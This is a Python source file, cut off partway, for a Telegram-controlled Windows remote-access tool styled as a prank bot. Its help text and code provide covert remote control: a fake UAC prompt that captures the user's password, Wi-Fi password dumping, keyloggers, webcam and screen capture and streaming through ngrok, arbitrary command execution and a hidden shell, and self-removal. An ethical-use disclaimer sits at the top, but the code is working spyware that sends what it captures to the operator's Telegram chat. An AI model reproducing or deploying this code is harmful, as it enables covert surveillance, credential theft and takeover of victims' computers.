"""
WARNINGS:
This code is meant only to run on Windows 10/11 (7 and 8 probably work as well), the original project was to make it cross platform but then I realized it was too much work, sorry Linux.
This code is NOT meant to be used without the owner's consent, it is meant for ethical use only, I am not responsable for any illegal use of this program.
If you lose control of your telegram bot, you could potentially lose the control of YOUR OWN MACHINE.

~Riccardo Zappitelli
"""


__version__ = "2.20"


#TELEGRAM
import requests
from telepot import Bot, glance
from telepot.loop import MessageLoop
from telepot.exception import TelegramError
from urllib3.exceptions import MaxRetryError
from telepot.namedtuple import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup

#IMAGES
import numpy as np
from PIL import Image
from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                 setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                 destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap,
                 destroyWindow, destroyAllWindows, copyMakeBorder, BORDER_CONSTANT)

#MERGE AUDIO&VIDEO
from moviepy.editor import AudioFileClip, VideoFileClip

#AUDIO
import soundfile as sf
import sounddevice as sd

try:
    from winsound import PlaySound, SND_FILENAME, SND_ASYNC
except ImportError:
    PlaySound = lambda *args:args
    SND_FILENAME = None

#MISC
import sys
import json
import ctypes
import psutil
import socket
import inspect
import traceback
from io import BytesIO
import pyautogui as pg
import subprocess as sp
from shutil import copy2
from re import findall, M
from time import time, sleep
from threading import Thread
from datetime import datetime
from tempfile import gettempdir
from typing import Any, Callable
from random import choice, randint
from winotify import audio, Notification
from webbrowser import open as browseropen
from string import ascii_letters, printable
from subprocess import CREATE_NO_WINDOW, PIPE, Popen
from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, rename
from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
from os.path import join, abspath, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize

#UTILS
import pyngrok
from utils.tunnel_handler import *
from utils.duckyscript import toducky
from utils.mymixer import CustomMixer
from utils.wifidumper import WifiDumper
from utils.cmdsession import CMDSession

def resource_path(relative_path: str) -> str:
    if getattr(sys, 'frozen', False):
        base_path = dirname(sys.executable)
    else:
        base_path = dirname(__file__)
    return join(base_path, relative_path)

logging = False
iswindows = name == "nt"
islinux = not iswindows
cwd_folder = getcwd()
HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
BURN_DIRECTORY = gettempdir()
TELEGRAM_BOT_LIMIT = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)

all_spinners = {
    "slash": ["|", "/", "-", "\\"],
    "double_bar": ["-", "=", "~", "-"],
    "dot_wave": [".  ", ".. ", "...", " ..", "  .", "   "],
    "line_bounce": ["_", "‾"],
    "dots_3": ["⠁", "⠂", "⠄", "⠂"],
    "quarter": ["◴", "◷", "◶", "◵"],
    "half_moon": ["◐", "◓", "◑", "◒"],
    "block_corner": ["▖", "▘", "▝", "▗"],
    "clock": ["🕛", "🕐", "🕑", "🕒", "🕓", "🕔", "🕕", "🕖", "🕗", "🕘", "🕙", "🕚"],
    "arrow": ["←", "↖", "↑", "↗", "→", "↘", "↓", "↙"],
    "double_arrow": ["⇐", "⇑", "⇒", "⇓"],
    "braille": ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"],
    "colored_blocks": ["🟥⬜⬜", "🟩🟥⬜", "⬜🟩🟥", "⬜⬜🟩", "⬜⬜⬜"],
    "bouncing_bar": ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃", "▂", "▁"],
    "pixel": ["⡀", "⠄", "⠂", "⠁", "⠈", "⠐", "⠠", "⢀"],
    "circle_dots": ["◜", "◠", "◝", "◞", "◡", "◟"],
    "gear": ["⚙️", "⚙️", "⚙️", "⚙️"],  # static gear, or rotate manually
    "signal": ["▂", "▄", "▆", "▇", "█", "▇", "▆", "▄"]
}

emoji_dict = {
    "stop": "🛑",
    "warning": "⚠️",
    "error": "❌",
    "success": "✅",
    "loading": "⏳",
    "wifi": "🛜",
    "ip": "🌐",
    "key": "🔑",
    "lock": "🔒",
    "unlock": "🔓",
    "id": "🆔",
    "camera": "📸",
    "microphone": "🎤",
    "volume_high": "🔊",
    "volume_medium": "🔉",
    "volume_mute": "🔇",
    "video": "🎥",
    "photo": "📷",
    "play": "▶️",
    "pause": "⏸️",
    "file": "📄",
    "folder": "📁",
    "document": "📑",
    "checkbox": "☑️",
    "radio": "🔘",
    "next": "➡️",
    "previous": "⬅️",
    "close": "❌",
    "shutdown": "⏻",
    "mouse": "🖱️",
    "keyboard": "⌨️",
    "screen": "🖥️",
    "ghost": "👻",
    "robot": "🤖",
    "thinking": "🤔",
    "spinner": "🌀",
    "hourglass": "⏳",
    "progress": "▰",
    "empty_progress": "▱",
    "arrow_up": "⬆️",
    "arrow_down": "⬇️",
    "arrow_left": "⬅️",
    "arrow_right": "➡️",
    "double_arrow": "⇆",
    "full_block": "█",
    "empty_block": "░",
    "loading_block": "▒",
    "settings": "⚙️",
    "home": "🏠",
    "back": "↩️",
    "refresh": "🔄",
    "speaker": "🔈",
    "muted_speaker": "🔇",
    "sound_waves": "🔊",
    "plankton": "🦑",
    "john_pork": "🐷",
    "gabinetto": "🚽"
}

try:
    vfx = resource_path(join("assets", "vfx"))
    sfx = resource_path(join("assets", "sfx"))
    executables = resource_path(join("assets", "executables"))
    fake_uac_prompt_path = join(executables, "fakeuac.exe")
    prototxt_filename = resource_path(join("assets","model","1.prototxt"))
    caffemodel_filename = resource_path(join("assets","model","2.caffemodel"))
except Exception as e:
    print(e)
    exit()

def _patched_popen(*args, **kwargs):
    cmd_list = []
    if args:
        cmd_list = list(args)
    elif 'args' in kwargs:
        cmd_list = kwargs['args'] if isinstance(kwargs['args'], list) else [kwargs['args']]
    if any("ngrok" in str(part).lower() for part in cmd_list):
        kwargs["creationflags"] = kwargs.get("creationflags", 0) | CREATE_NO_WINDOW
    kwargs.setdefault("stderr", PIPE)
    kwargs.setdefault("stdout", PIPE)
    return Popen(*args, **kwargs)

def close_all_tunnels(ngrok):
    tunnels = ngrok.get_tunnels()
    for tunnel in tunnels:
        try:
            ngrok.disconnect(tunnel.public_url)
        except Exception as e:
            print(f"Failed to disconnect {tunnel.public_url}: {e}")

def randomname(lenght: int=10) -> str:
    return "".join([ choice(ascii_letters) for _ in range(lenght)])

while isfile(BURN_DIRECTORY):
    BURN_DIRECTORY = BURN_DIRECTORY+randomname(3)

if isfile(prototxt_filename) and isfile(caffemodel_filename):
    with open(prototxt_filename, 'rb') as f:
        prototxt_data = f.read()
    with open(caffemodel_filename, 'rb') as f:
        caffemodel_data = f.read()
    prototxt_buffer = np.frombuffer(prototxt_data, dtype=np.uint8)
    caffemodel_buffer = np.frombuffer(caffemodel_data, dtype=np.uint8)
    FACERECOGNITION = True
    net = dnn.readNetFromCaffe(prototxt_buffer.tobytes(), caffemodel_buffer.tobytes())
else:
    FACERECOGNITION = False

CMD_SESSION_HELP = r"""
exit - Exits the cmd session without killing it.

___ SPECIAL COMMANDS ___
:download <path> - Downloads a file. A file larger then 30MB will be split in more files.
:kill - Kill the cmd session, also kills the process.
"""

DUCKYHELP = r"""DELAY [time] – Adds a delay in milliseconds (e.g., DELAY 1000 waits 1 second).
REM [comment] – Adds a comment (e.g., REM This is a comment).
STRING [text] – Types a string of characters (e.g., STRING Hello World).
ENTER – Presses the Enter key.
SPACE – Presses the Spacebar.
TAB – Presses the Tab key.
ESC – Presses the Escape key.
CTRL – Presses the Control key.
SHIFT – Presses the Shift key.
ALT – Presses the Alt key.
GUI – Presses the Windows key (or the "Command" key on macOS).
WINDOWS – Same as GUI.
APP – Presses the "Application" key (context menu key).
DOWNARROW, UPARROW, LEFTARROW, RIGHTARROW – Presses arrow keys.
CAPSLOCK – Toggles Caps Lock.
NUMLOCK – Toggles Num Lock.
DELETE – Presses the Delete key.
HOME – Presses the Home key.
END – Presses the End key.
PAGEUP – Presses Page Up.
PAGEDOWN – Presses Page Down."""

HELP = r"""
🏠 Main Menu
mainmenu - Sends the main menu.

🛑 System & Shutdown
fakeuac - Displays a fake uac prompt and sends you the password.
shutdown - Shut down the PC.
fakeshutdown - Fake system shutdown.
altf4 - Simulate Alt + F4.
clear - Removes all cv2 windows, closes webcam and removes temporary files.
selfdestruction - Removes the program from the machine permanently.

🌐 Network & Remote Access
wifiinfo - Dump saved Wi-Fi SSIDs and passwords.
getip - Get public IP and geolocation.

📸 Camera & Screen
selfie - Take a webcam selfie.
screenshot - Capture screen.
fullclip - Record screen + webcam.
webcamclip - Record webcam.
screenclip - Record screen.
recordjum - Records 20 second clip of jumpscare.
waitforface - Send a webcam photo when face is detected till timeout.
displaymode - Send a display set menu.
webcamstreamstart - Sets you a link to a webcam stream.
screenstreamstart - Sets you a link to a screen stream.
webcamstreamstop - Stops the webcam stream.
screenstreamstop - Stops the screen stream.
webcamandscreenstreamstart - Sets you a link to a webcam and screen stream.
webcamandscreenstreamstop - Stops the webcam and screen stream.

🔊 Audio & Volume
urltoast - Shows a url opening windows toast.
breath - Play breathing sound.
pss - Play "psst" sound.
microphone - Record mic audio.
mutevolume - Set computer's volume to 0.
fullvolume - Set computer's volume to 100.
setvolume - Set computer's volume level.
getvolume - Gets the computer's volume level.
tralalerotralala - Plays italian brainrot.
mixermenu - Sends a mixer menu.

😈 Pranks & Visuals
jumpscare - Show random jumpscare.
jumpscarenoaudio - Jumpscare no audio.
invertedscreen - Shows inverted colors screenshot.
distortedscreen - Shows distorted screenshot.
messagebox - Show a custom message box.
messagespam - Spam message boxes.
camerawallpaper - Sets webcam's frames as wallpaper.
setvideowallpaper - Sets a video as wallpaper.

💻 System Control
execute - Run system command.
processkiller - Shows a table of processes that you can kill.
terminateprocess - Kills a process by name.
procmonmenu - Shows procmon menu.
procmonadd - Adds a process to the process monitor list.
procmonrem - Removes a process to the process monitor list.
cmdsession - Enters a local cmd session.

🎮 Input / Device Control
randomkeyboard - Sets all user's input to random characters.
capslock - Activates capslock.
mousecontroller - Sends a mouse controlling menu.
mouselock - Locks the mouse in position.
setMouseJump - Sets the jump of the mouse in mousecontroller.

📋 Messaging
bsend - Send custom text.
id - Get Owner Chat ID.
deletemessages - Deletes the specifed number of messages.
deleteallmessages - Deletes all the messages in this session.

🔒 Can't Open List
cantopenadd - Adds process to cantopenlist.
cantopenremove - Removes process from cantopenlist.
cantopenmenu - Displays processes on cantopenlist, clicking them will remove them.

🧠 Keylogger
keylogger - Records pressed keys on keyboard.
livekeylogger - Sends live updates about what's being typed on the keyboard.

🦑 Misc
plankton - Plankton.
planktonnoaudio - Plankton no audio.
johnpork - John Pork.
johnporknoaudio - John Prok no audio.
gabinetti - Gabinetti nella villa.
duckyscript - Execute duckyscript string.
duckyhelp - Show Duckyscript tutorial.
browser - Open URL in browser.

📎 File Input Commands
*sending a photo* - Displays the photo on the screen as a pop-up.

*sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.

*sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).

*sending an audio/voice* - Will play the audio/voice in the background.

*sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)

*sending a file with /save and the path will save that file in that path, no matter the extension. (example *photo* /save C:\Users\YOURUSER\Photo\*

📚 Multi-Command
You can run multiple commands at the same time by sending them in the same message but separated by a comma.
For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
jumpscare while recording screen and webcam
"""


def now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def checkconn() -> bool:
    try:
        s = socket.socket()
        s.connect(("www.google.com",80))
        return True
    except Exception as e:
        return False

#AUDIO CONVERSION
def wav_to_ogg(filename: str, rmold: bool=False) -> str:
    data, samplerate = sf.read(filename)
    new_filepath = filename.replace(".wav", ".ogg")
    sf.write(new_filepath, data, samplerate, format="OGG", subtype="OPUS")
    if rmold:
        remove(filename)
    return new_filepath

def ogg_to_wav(filename: str, rmold: bool=False) -> str:
    data, sr = sf.read(filename) 
    new_filepath = filename.replace(".ogg", ".wav")
    sf.write(new_filepath, data, sr)
    if rmold:
        remove(filename)
    return new_filepath

#GETTING TOKEN AND CHAT_ID
def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
    with open(filename) as fi:
        var = json.load(fi)
    return var["token"],var["chatid"],var["ngrok_token"]
        
#Resizing assets so they all take the same time to load when doing jumpscares(I guess)
def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30) -> np.array:
    img = Image.fromarray(image_array)
    img_resized = img.resize(target_size, Image.Resampling.LANCZOS)
    buffer = BytesIO()
    img_resized.save(buffer, 'JPEG', quality=quality)
    buffer.seek(0)
    compressed_image = np.array(Image.open(buffer))
    return compressed_image

def show_image_fullscreen(image, timeout=1250) -> None:
    namedWindow("FullScreenImage", WND_PROP_FULLSCREEN)
    setWindowProperty("FullScreenImage", WND_PROP_TOPMOST, 1)
    setWindowProperty("FullScreenImage", WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN)
    imshow("FullScreenImage", image) 
    waitKey(timeout)
    destroyAllWindows()

def invert_image(imagearray:np.array) -> np.array:
    return bitwise_not(imagearray)

def distorted_screen(image, strength=5, frequency=50):
    h, w, _ = image.shape
    map_x, map_y = np.meshgrid(np.arange(w, dtype=np.float32), np.arange(h, dtype=np.float32))

    map_x += np.sin(map_y / frequency) * strength
    map_y += np.cos(map_x / frequency) * strength

    distorted = remap(image, map_x, map_y, interpolation=INTER_LINEAR, borderMode=BORDER_REFLECT)
    return distorted

def detect_face(cap:VideoCapture|None=None) -> tuple[int,Mat]:
    if not FACERECOGNITION:
        return False, None
    rls=True
    if cap:
        rls=False
    else:
        cap = VideoCapture(0)
    ret, frame = cap.read()
    if not ret:
        return 0, None
    if rls:
        cap.release()
    blob = dnn.blobFromImage(frame, 1.0, (300, 300), (104.0, 177.0, 123.0), False, False)
    net.setInput(blob)
    detections = net.forward()
    return sum(1 for i in range(detections.shape[2]) if detections[0, 0, i, 2] > 0.5), frame

def load_images(vfx_folder: str=vfx) -> dict[str:Mat]:
    return { x[:-4]:compress_and_resize_image(imread(join(vfx_folder,x))) for x in listdir(vfx_folder) }

def load_audios(sfx_folder: str=sfx) -> list[str]:
    return { x[:-4]:abspath(join(sfx_folder,x)) for x in listdir(sfx_folder) }

def randompngname(lenght: int=10) -> str:
    return randomname(lenght)+".png"

def get_current_wallpaper():
    SPI_GETDESKWALLPAPER = 0x0073
    MAX_PATH = 260
    buffer = ctypes.create_unicode_buffer(MAX_PATH)
    ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, buffer, 0)
    path = buffer.value
    return path if isfile(path) else None

def get_function_parameters(func):
    sig = inspect.signature(func)
    params = []
    for name, param in sig.parameters.items():
        if param.kind == inspect.Parameter.VAR_POSITIONAL:
            params.append(f'*{name}')
        elif param.kind == inspect.Parameter.VAR_KEYWORD:
            params.append(f'**{name}')
        else:
            params.append(name)
    return params

def get_required_params(func):
    sig = inspect.signature(func)
    return [
        name for name, param in sig.parameters.items()
        if param.default == inspect.Parameter.empty
        and param.kind in (
            inspect.Parameter.POSITIONAL_ONLY,
            inspect.Parameter.POSITIONAL_OR_KEYWORD,
            inspect.Parameter.KEYWORD_ONLY
        )
    ]

def backup_wallpaper(backup_path):
    current_wallpaper = get_current_wallpaper()
    if exists(current_wallpaper):
        copy2(current_wallpaper, backup_path)
        return True
    else:
        return False

def change_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20  
    SPIF_UPDATEINIFILE = 0x01  
    SPIF_SENDWININICHANGE = 0x02  

    try:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abspath(image_path),
                                                   SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
        return True
    except Exception as e:
        return False

def pad_to_16_9(image):
    height, width = image.shape[:2]
    current_ratio = width / height
    target_ratio = 16 / 9
    if abs(current_ratio - target_ratio) < 0.01:
        return image
    if current_ratio > target_ratio:
        new_height = int(width / target_ratio)
        pad = (new_height - height) // 2
        padded = copyMakeBorder(image, pad, new_height - height - pad, 0, 0, BORDER_CONSTANT, value=(0, 0, 0))
    else:
        new_width = int(height * target_ratio)
        pad = (new_width - width) // 2
        padded = copyMakeBorder(image, 0, 0, pad, new_width - width - pad, BORDER_CONSTANT, value=(0, 0, 0))
    return padded

def notify_toast(appname: str, title: str, message: str, url_label: str, url: str) -> None:
    toast = Notification(
        app_id=appname, 
        title=title,
        msg=message,
        duration="short",
    )

    toast.add_actions(label=url_label, launch=url)
    toast.set_audio(audio.Default, loop=False)
    toast.show()

def terminate_process_by_name(process_name: str) -> None:
    for proc in psutil.process_iter():
        if proc.name().lower() == process_name.lower().strip():
                proc.terminate()


"""
oooooooooo.                  .       .                                  ooo        ooooo
`888'   `Y8b               .o8     .o8                                  `88.       .888'
 888     888 oooo  oooo  .o888oo .o888oo  .ooooo.  ooo. .oo.    .oooo.o  888b     d'888   .ooooo.  ooo. .oo.   oooo  oooo  
 888oooo888' `888  `888    888     888   d88' `88b `888P"Y88b  d88(  "8  8 Y88. .P  888  d88' `88b `888P"Y88b  `888  `888  
 888    `88b  888   888    888     888   888   888  888   888  `"Y88b.   8  `888'   888  888ooo888  888   888   888   888  
 888    .88P  888   888    888 .   888 . 888   888  888   888  o.  )88b  8    Y     888  888    .o  888   888   888   888  
o888bood8P'   `V88V"V8P'   "888"   "888" `Y8bod8P' o888o o888o 8""888P' o8o        o888o `Y8bod8P' o888o o888o  `V88V"V8P' 
"""
class ButtonsMenu:
    def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0, next_btn_lab: str = "next_page", prev_btn_lab: str = "previous_page", close_btn_lab="close_page", keyboard_rows=2) -> None:
        self.bot = bot
        self.label = label
        self.chat_id = chat_id
        self.buttons = buttons
        self._page_limit = page_limit
        self._page = page 
        self.keyboard_rows = keyboard_rows
        self.next_btn = next_btn
        self.next_btn_lab = next_btn_lab
        self.prev_btn_lab = prev_btn_lab
        self.close_btn_lab = close_btn_lab
        self.sent = False

        if autosend:
            self.send_keyboard()

    def create_keyboard(self) -> Any:
        start_index = self._page * self._page_limit
        button_list = [InlineKeyboardButton(text=k, callback_data=self.buttons[k]) for k in list(self.buttons.keys())[start_index:start_index + self._page_limit]]

        if self.next_btn:
            if self._page > 0:
                button_list.append(InlineKeyboardButton(text="⬅️ Previous", callback_data=self.prev_btn_lab))
            if (self._page + 1) * self._page_limit < len(self.buttons):
                button_list.append(InlineKeyboardButton(text="Close ❌", callback_data=self.close_btn_lab)) 
                button_list.append(InlineKeyboardButton(text="Next ➡️", callback_data=self.next_btn_lab)) 
        else:
            button_list.append(InlineKeyboardButton(text="Close ❌", callback_data=self.close_btn_lab)) 

        keyboard_rows = [button_list[i:i+self.keyboard_rows] for i in range(0, len(button_list), self.keyboard_rows)]
        return InlineKeyboardMarkup(inline_keyboard=keyboard_rows)

    def send_keyboard(self) -> int:
        self.keyboard = self.create_keyboard()
        self.sent = True
        self.message_id = self.bot.sendMessage(self.chat_id, self.label, reply_markup=self.keyboard)["message_id"]
        return self.message_id

    def send_next_page(self) -> None:
        self._page += 1
        self.send_keyboard()
    
    def send_previous_page(self) -> None:
        self._page -= 1
        self.send_keyboard()

    def edit_keyboard(self, buttons: dict) -> int:
        self.buttons = buttons
        self.keyboard = self.create_keyboard()
        self.message_id = self.bot.editMessageReplyMarkup((self.chat_id, self.message_id), reply_markup=self.keyboard)["message_id"]
        return self.message_id

    def delete(self):
        try:
            if self.sent:
                self.bot.deleteMessage((self.chat_id, self.message_id))
        except TelegramError:
            ...

"""
oooooooooooo       .o8   o8o      .              .o8       oooo            ooo        ooooo
`888'     `8      "888   `"'    .o8             "888       `888            `88.       .888'
 888          .oooo888  oooo  .o888oo  .oooo.    888oooo.   888   .ooooo.   888b     d'888   .ooooo.   .oooo.o  .oooo.o  .oooo.    .oooooooo  .ooooo.  
 888oooo8    d88' `888  `888    888   `P  )88b   d88' `88b  888  d88' `88b  8 Y88. .P  888  d88' `88b d88(  "8 d88(  "8 `P  )88b  888' `88b  d88' `88b 
 888    "    888   888   888    888    .oP"888   888   888  888  888ooo888  8  `888'   888  888ooo888 `"Y88b.  `"Y88b.   .oP"888  888   888  888ooo888 
 888       o 888   888   888    888 . d8(  888   888   888  888  888    .o  8    Y     888  888    .o o.  )88b o.  )88b d8(  888  `88bod8P'  888    .o 
o888ooooood8 `Y8bod88P" o888o   "888" `Y888""8o  `Y8bod8P' o888o `Y8bod8P' o8o        o888o `Y8bod8P' 8""888P' 8""888P' `Y888""8o `8oooooo.  `Y8bod8P' 
                                                                                                                                  d"     YD
                                                                                                                                  "Y88888P'
"""
class EditableMessage:
    def __init__(self, bot: Bot, chat_id, content: str, autosend: bool=True, bold: bool=False) -> None:
        self.bot = bot
        self.bold = bold
        self.chat_id = chat_id
        self.content = content
        self.sent = False
        if autosend:
            self.send()
    
    def send(self) -> int|None:
        if self.bold:
            self.content = f"<b>{self.content}</b>"
        try:
            self.message_id = self.bot.sendMessage(self.chat_id, self.content, parse_mode="HTML" if self.bold else None)["message_id"]
            self.sent = True
            return self.message_id
        except Exception as e:
            ...
    
    def edit(self, new_content: str) -> bool:
        if new_content.strip() == self.content.strip():
            return False
        if self.bold:
            new_content = f"<b>{new_content}</b>"
        try:
            self.bot.editMessageText((self.chat_id, self.message_id), new_content, parse_mode="HTML" if self.bold else None)
            return True
        except TelegramError as e:
            return False
    
    def delete(self) -> None:
        try:
            if self.sent:
                self.bot.deleteMessage((self.chat_id, self.message_id))
        except TelegramError:
            pass#since we have no way of notifying the user
    
    def delete_and_send(self, message: str) -> None:
        self.delete()
        self.bot.sendMessage(self.chat_id, message)

"""
      .o.                           o8o   o8o        .o.                    o8o                                  .    o8o
     .888.                          `"'   `"'       .888.                   `"'                                .o8    `"'
    .8"888.      .oooo.o  .ooooo.  oooo  oooo      .8"888.     ooo. .oo.   oooo  ooo. .oo.  .oo.    .oooo.   .o888oo oooo   .ooooo.  ooo. .oo.   
   .8' `888.    d88(  "8 d88' `"Y8 `888  `888     .8' `888.    `888P"Y88b  `888  `888P"Y88bP"Y88b  `P  )88b    888   `888  d88' `88b `888P"Y88b  
  .88ooo8888.   `"Y88b.  888        888   888    .88ooo8888.    888   888   888   888   888   888   .oP"888    888    888  888   888  888   888  
 .8'     `888.  o.  )88b 888   .o8  888   888   .8'     `888.   888   888   888   888   888   888  d8(  888    888 .  888  888   888  888   888  
o88o     o8888o 8""888P' `Y8bod8P' o888o o888o o88o     o8888o o888o o888o o888o o888o o888o o888o `Y888""8o   "888" o888o `Y8bod8P' o888o o888o 
"""
class AsciiAnimation(EditableMessage):
    def __init__(self, bot, chat_id, frames, autosend=True, bold=False):
        super().__init__(bot, chat_id, content=frames[0], autosend=autosend, bold=bold)
        self.frames = frames
    
    def play(self, repeat: int):
        for i in range(repeat):
            for frame in self.frames:
                self.edit(frame)
                sleep(0.5)

"""
ooooo                                  .o8   o8o                         oooooooooo.
`888'                                 "888   `"'                         `888'   `Y8b
 888          .ooooo.   .oooo.    .oooo888  oooo  ooo. .oo.    .oooooooo  888     888  .oooo.   oooo d8b 
 888         d88' `88b `P  )88b  d88' `888  `888  `888P"Y88b  888' `88b   888oooo888' `P  )88b  `888""8P 
 888         888   888  .oP"888  888   888   888   888   888  888   888   888    `88b  .oP"888   888     
 888       o 888   888 d8(  888  888   888   888   888   888  `88bod8P'   888    .88P d8(  888   888     
o888ooooood8 `Y8bod8P' `Y888""8o `Y8bod88P" o888o o888o o888o `8oooooo.  o888bood8P'  `Y888""8o d888b    
                                                              d"     YD
                                                              "Y88888P'
"""
class LoadingBar:
    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left", bar_lenght: int=10, pin_message: bool=True):
        self.bot = bot
        self.tot = int(total)
        self.label = label
        self.chat_id = chat_id
        self.showperc = showperc
        self.autodelete = autodelete


        self.spinner = spinner_frames
        self.spinner_index = 0
        self.spinner_enabled = spinner_enabled
        self.spinner_delay = 0.2
        self.spinner_pos = spinner_pos

        self.full_char = full_char
        self.empty_char = empty_char

        self.progress = 0
        self.done = False
        self.deleted = False
        self.bar_lenght = bar_lenght

        self.bar = self.get_bar()
        self.pin_message = pin_message

        if autosend:
            self.setup()

    def get_bar(self):
        self.perc_progress = round((self.progress / self.tot) * 100, 1)
        self.int_perc_progress = int(self.perc_progress)
        bar = self.full_char * (self.int_perc_progress//self.bar_lenght) + (self.empty_char * ((self.bar_lenght - (self.int_perc_progress//self.bar_lenght))))
        bar = f"{bar}" + (f"{self.perc_progress}%" if self.showperc else "")
        if self.label:
            bar = f"{self.label}\n{bar}"
        if self.spinner_enabled:
            bar = f"{self.spinner[self.spinner_index]}{bar}" if self.spinner_pos == "left" else f"{bar}{self.spinner[self.spinner_index]}"
        return bar

    def spinner_cycle(self):
        while self.perc_progress < 100:
            new_bar = self.get_bar()
            self.ETDMessage.edit(new_bar)
            if self.spinner_index == len(self.spinner)-1:
                self.spinner_index = 0
            else:
                self.spinner_index += 1
            sleep(self.spinner_delay)

    def prep_animation(self, repeat: int = 2, progress: int = 25) -> None:
        for i in range(repeat):
            for i in range(0, 101, progress):
                self.set_progress(i)
                self.update()
                sleep(0.05)
            for i in range(100, 0, -progress):
                self.set_progress(i)
                self.update()
                sleep(0.05)

            for i in range(0, 101, progress):
                self.set_progress(i)
                self.update()
            sleep(0.05)
        self.set100()
        self.delete()

    def setup(self):
        bar = self.get_bar()
        self.ETDMessage = EditableMessage(self.bot, self.chat_id, bar)
        self.bot.pinChatMessage(self.chat_id, self.ETDMessage.message_id)
        if self.spinner_enabled:
            t = Thread(target=self.spinner_cycle)
            t.start()

    def set_progress(self, progress: int) -> None:
        self.progress = progress

    def update(self, new_progress: None|int=None):
        if new_progress:
            self.set_progress(new_progress)
        if self.done:
            return
        previous_bar = self.bar
        bar = self.get_bar()
        if bar!=previous_bar:
            self.ETDMessage.edit(bar)
            return
        if self.int_perc_progress >= 100 and self.autodelete:
            self.ETDMessage.delete()
            self.done = True
    
    def fill_and_delete(self) -> None:
        self.set100()
        self.delete()
    
    def delete(self):
        if not self.deleted:
            self.deleted = True
            self.ETDMessage.delete()
    
    def set100(self):
        if self.done:
            return
        self.progress = self.tot
        self.update()




"""
ooooooooo.     .oooooo.   ooooooooo.
`888   `Y88.  d8P'  `Y8b  `888   `Y88.
 888   .d88' 888           888   .d88'  .ooooo.  oo.ooooo.
 888ooo88P'  888           888ooo88P'  d88' `88b  888' `88b
 888`88b.    888           888         888ooo888  888   888
 888  `88b.  `88b    ooo   888         888    .o  888   888
o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  888
                                                 o888o
"""
class PeppinoTelegram:
    def __init__(self, token: str, owner_id: int, ngrok_token: str, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]], signal_error: str|None = None) -> None:
        self.token = token
        self.owner_id = owner_id
        self.ngrok_token = ngrok_token
        self.can_use_ngrok = bool(ngrok_token)
        if self.can_use_ngrok:
            self.tunnelhandler = TunnelManager()

        if signal_error:
            self.bsend(signal_error)

        self.loading_bar_set = loading_bar_set
        self.loading_bar_spinner = loading_bar_spinner

        # this is used to send input prompts to the user without stopping the code
        self.user = {
            "status":None,             #can be "input_requested" or None 
            "last_response":None       #can be None, or the last response of an input
        }

        self.MOUSE_JMP = 50

        self.webcam_url = None
        self.screen_url = None
        self.webcam_and_screen_url = None

        self.help = HELP
        self.process_killer_page = 0
        self.owner_name = ""
        self.cap = capture
        self.bot = Bot(token) 
        self.cantopenlist = []
        self.processmonitorlist = {} 
        self.duckyhelp = DUCKYHELP
        self.explorer_path = getcwd() # For now I'm not looing forward to make a file explorer
        self.audio_mixer = mixer
        self.running = True
        self.message_timeout = 5
        self.process_explorer_menu = None
        self.mixer_menu_keyboard = None
        self.mouse_controller_menu = None
        self.processmonitormenu = None
        self.display_mode_keyboard  = None
        self.cantopenmenu_ref = None
        self.mainmenu_ref = None
        self.wifidumper = WifiDumper()
        self.all_session_messages: list[int] = []

        self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
        self.cmd_session_active: bool = False

        LOADING_STATUS_MESSAGE = self.new_editable_message("Loading functions")#TODO Update user

        #gets the function from the text
        self.function_table: dict[str:Callable] = {
            "pss":self.pss,
            "psst":self.pss,
            "bsend":self.bsend,
            "stop":self.stop,
            "test":self.test,
            "altf4":self.altf4,
            "breath":self.breath,
            "browser":browseropen,
            "execute":lambda x: self.bsend(self.execute(x, return_output=True, shell=True)),
            "selfie":self.selfie,
            "plankton":self.plankton,
            "johnpork":self.johnpork,
            "shutdown":self.shutdown,
            "gabinetti":self.gabinetti,
            "jumpscare":self.jumpscare,
            "keylogger":self.keylogger,
            "screenshot":self.screenshot,
            "urltoast":notify_toast,
            "fakeuac":self.fakeuac,
            "messagebox":self.message_box,
            "waitforface":self.waitforface,
            "webcamclip":self.record_webcam,
            "screenclip":self.record_screen,
            "messagespam":self.spam_windows,
            "checkforface":self.checkforface,
            "fakeshutdown":self.fake_shutdown,
            "processkiller":self.process_killer,
            "livekeylogger":self.live_keylogger,
